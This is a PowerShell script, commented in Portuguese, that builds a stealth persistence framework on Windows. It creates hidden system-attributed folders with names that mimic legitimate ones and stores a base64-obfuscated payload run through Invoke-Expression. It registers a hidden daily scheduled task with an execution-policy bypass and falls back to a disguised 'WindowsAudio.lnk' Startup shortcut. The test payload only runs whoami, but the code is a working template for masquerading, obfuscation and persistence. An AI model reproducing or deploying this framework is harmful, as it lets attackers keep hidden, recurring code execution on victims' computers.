# 1. Pastas invisíveis
$LogDir = "$env:LOCALAPPDATA\Microsoft\Windows\DeviceMetadataCache"
$TempDir = "$env:TEMP\Windows\TempLogs"

# Criar diretórios (corrigido)
@($LogDir, $TempDir) | ForEach-Object {
    if (-not (Test-Path $_)) {
        New-Item -ItemType Directory -Path $_ -Force | Out-Null
    }
    # Atributos corretos
    $item = Get-Item $_ -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
}

# 2. Payload simples para teste
$Payload = @'
# Teste simples
$output = whoami
$output | Out-File "$env:LOCALAPPDATA\Microsoft\Windows\DeviceMetadataCache\test.log" -Append
'@

# 3. Script ofuscado (corrigido)
$ScriptName = "CacheManager_" + (Get-Date -Format "yyyyMMdd") + "_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".ps1"
$ScriptPath = "$LogDir\$ScriptName"

# Codificar payload corretamente
$Obfuscated = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Payload))
"# Encoded script`n`$code=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$Obfuscated'));Invoke-Expression `$code" | 
    Out-File -FilePath $ScriptPath -Encoding UTF8

# 4. Tarefa agendada (simplificada para teste)
$TaskName = "DeviceMetadataMaintenance"
$TaskDescription = "Manutenção automática de metadados de dispositivos"

# Argumentos CORRETOS
$ActionArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& {Start-Sleep -Seconds 10; if (Test-Path '$ScriptPath') { `$content = Get-Content '$ScriptPath' -Raw; if (`$content -match '^# Encoded script') { Invoke-Expression `$content } } }`""

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $ActionArgs
$Trigger = New-ScheduledTaskTrigger -Daily -At "3:00AM"

# Configurações simplificadas
$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Principal com SYSTEM (pode precisar de admin)
try {
    # Registrar tarefa
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description $TaskDescription -Force -ErrorAction Stop
    
    Write-Host "Tarefa criada com sucesso!" -ForegroundColor Green
    
    # Testar execução imediata (opcional)
    Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    Write-Host "Tarefa iniciada para teste" -ForegroundColor Yellow
    
} catch {
    Write-Host "Erro ao criar tarefa: $_" -ForegroundColor Red
    Write-Host "Criando atalho na inicialização..." -ForegroundColor Yellow
    
    # Fallback para inicialização do usuário
    $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $ShortcutPath = "$StartupPath\WindowsAudio.lnk"
    
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep 60; if (Test-Path '$ScriptPath') { `$c=Get-Content '$ScriptPath' -Raw; if (`$c -match '^# Encoded script') { iex `$c } }`""
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
    
    Write-Host "Atalho criado: $ShortcutPath" -ForegroundColor Green
}

# 5. Verificar criação
Write-Host "`nVerificando criação:" -ForegroundColor Cyan
Write-Host "Script salvo em: $ScriptPath"
Write-Host "Tarefa: $TaskName"
Write-Host "`nPara testar manualmente: Get-ScheduledTask -TaskName '$TaskName' | Start-ScheduledTask" -ForegroundColor Yellow

# Não auto-excluir para debug
# $currentPath = $MyInvocation.MyCommand.Path
# if (Test-Path $currentPath) {
#     Write-Host "O script original será mantido para debug" -ForegroundColor Magenta
# }
